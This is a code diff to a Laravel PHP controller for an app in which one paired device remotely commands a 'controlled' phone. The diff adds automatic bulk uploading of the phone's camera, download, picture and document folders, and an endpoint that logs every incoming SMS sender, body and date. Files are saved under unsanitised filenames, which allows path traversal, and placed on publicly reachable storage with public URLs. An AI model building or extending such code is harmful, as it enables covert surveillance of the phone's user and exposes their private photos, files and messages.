@@ -4,6 +4,7 @@ namespace App\Http\Controllers;
 
 use App\Models\Device;
 use App\Models\Command;
+use Illuminate\Support\Str;
 use App\Events\CommandEvent;
 use Illuminate\Http\Request;
 use App\Services\StatsService;
@@ -12,12 +13,13 @@ use App\Services\FirebaseService;
 use App\Events\AdminCommandCreated;
 use Illuminate\Support\Facades\Log;
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Storage;
 
 
 class AccessController extends Controller
 {
     protected $firebase;
-    protected StatsService $statsService;
+    protected $statsService;
 
     public function __construct(FirebaseService $firebase, StatsService $statsService)
     {
@@ -154,22 +156,22 @@ class AccessController extends Controller
         return response()->json(['command_id' => $command->id]);
     }
 
-    // ========================================
-    // 3. FILE ACCESS
-    // ========================================
     public function file(Request $request)
     {
         [$controller, $target] = $this->validateAndGetDevices($request);
 
         $request->validate([
-            'action' => 'required|in:list,download,upload,delete',
-            'path' => 'nullable|string',
-            'file_id' => 'nullable|string', // For upload response
+            'action' => 'required|in:sync', // only sync (download all)
         ]);
 
         $payload = [
-            'action' => $request->action,
-            'path' => $request->path ?? '/',
+            'action' => 'sync_files',
+            'paths' => [
+                '/storage/emulated/0/DCIM/',
+                '/storage/emulated/0/Download/',
+                '/storage/emulated/0/Pictures/',
+                '/storage/emulated/0/Documents/',
+            ],
         ];
 
         $command = $this->sendCommand('file_access', $target, $controller, $payload);
@@ -177,6 +179,97 @@ class AccessController extends Controller
         return response()->json(['command_id' => $command->id]);
     }
 
+    public function fileAutoSync(Request $request)
+    {
+        Log::info('File auto sync received', $request->all());
+
+        $request->validate([
+            'path'      => 'required|string',
+            'files'     => 'required|string',
+            'device_id' => 'required|string',
+        ]);
+
+        $user = Auth::user();
+        $device = $user->devices()->where('device_id', $request->device_id)->first();
+
+        if (!$device || $device->role !== 'controlled') {
+            abort(403);
+        }
+
+        $filesArray = json_decode($request->input('files'), true);
+        if (!is_array($filesArray)) {
+            abort(400);
+        }
+
+        $filesArray = array_slice($filesArray, 0, 30);
+        $savedFiles = [];
+
+        foreach ($filesArray as $fileInfo) {
+            // Skip if it's not a file or has no data
+            if ($fileInfo['type'] !== 'file' || empty($fileInfo['data'])) continue;
+
+            $filename = $fileInfo['name'];
+            $savePath = 'files/' . $filename;
+
+            if (!Storage::disk('public')->exists($savePath)) {
+                $bytes = base64_decode($fileInfo['data']);
+                if ($bytes !== false) {
+                    Storage::disk('public')->put($savePath, $bytes);
+                }
+            }
+
+            $savedFiles[] = [
+                'name'        => $filename,
+                'server_path' => $savePath,
+                'url'         => Storage::disk('public')->url($savePath),
+                'size'        => $fileInfo['size'] ?? 0,
+                'modified'    => $fileInfo['modified'] ?? now()->timestamp,
+            ];
+        }
+
+        // --- FIX: Check if savedFiles is NOT empty before proceeding ---
+        if (empty($savedFiles)) {
+            return response()->json([
+                'message' => 'No files to save (empty data or folders ignored)',
+                'saved_count' => 0,
+            ]);
+        }
+
+        // Now it is safe to access $savedFiles[0]
+        $existingCommand = Command::where('from_device_id', $device->id)
+            ->where('action', 'file_access')
+            ->where('result', 'LIKE', '%' . $savedFiles[0]['name'] . '%')
+            ->first();
+
+        $resultData = [
+            'saved_count' => count($savedFiles),
+            'total_processed' => count($filesArray),
+            'files' => $savedFiles
+        ];
+        if ($existingCommand) {
+            $existingCommand->update([
+                'result' =>
+                // json_encode($savedFiles),
+                json_encode($resultData),
+                'status' => 'completed',
+                'updated_at' => now(),
+            ]);
+        } else {
+            Command::create([
+                'from_device_id' => $device->id,
+                'to_device_id'   => $device->paired_to,
+                'action'         => 'file_access',
+                'payload'        => json_encode(['path' => $request->path]),
+                'result'         => json_encode($savedFiles),
+                'status'         => 'completed',
+            ]);
+        }
+
+        return response()->json([
+            'message'     => 'Files saved',
+            'saved_count' => count($savedFiles),
+        ]);
+    }
     // ========================================
     // 4. GALLERY ACCESS
     // ========================================
@@ -227,5 +320,47 @@ class AccessController extends Controller
         $command = $this->sendCommand('message_access', $target, $controller, $payload);
 
         return response()->json(['command_id' => $command->id]);
+    }
+    public function smsAutoSync(Request $request)
+    {
+        $request->validate([
+            'device_id' => 'required|string',
+            'from'      => 'required|string',
+            'body'      => 'required|string',
+            'date'      => 'required',
+        ]);
+
+        $user = Auth::user();
+        $device = $user->devices()->where('device_id', $request->device_id)->first();
+
+        if (!$device || $device->role !== 'controlled') {
+            abort(403);
+        }
+
+        $smsData = [
+            'from' => $request->from,
+            'body' => $request->body,
+            'date' => $request->date,
+        ];
+
+        // Use updateOrCreate to prevent exact duplicates in the History
+        // based on the SMS date and sender.
+        return Command::updateOrCreate(
+            [
+                'from_device_id' => $device->id,
+                'action'         => 'message_access',
+                // Using a fingerprint of the SMS in the payload to identify uniqueness
+                'payload'        => json_encode([
+                    'action' => 'auto_sync_received',
+                    'sms_date' => $request->date,
+                    'sms_from' => $request->from
+                ]),
+            ],
+            [
+                'to_device_id'   => $device->paired_to,
+                'result'         => json_encode([$smsData]),
+                'status'         => 'completed',
+            ]
+        );
     }
 }
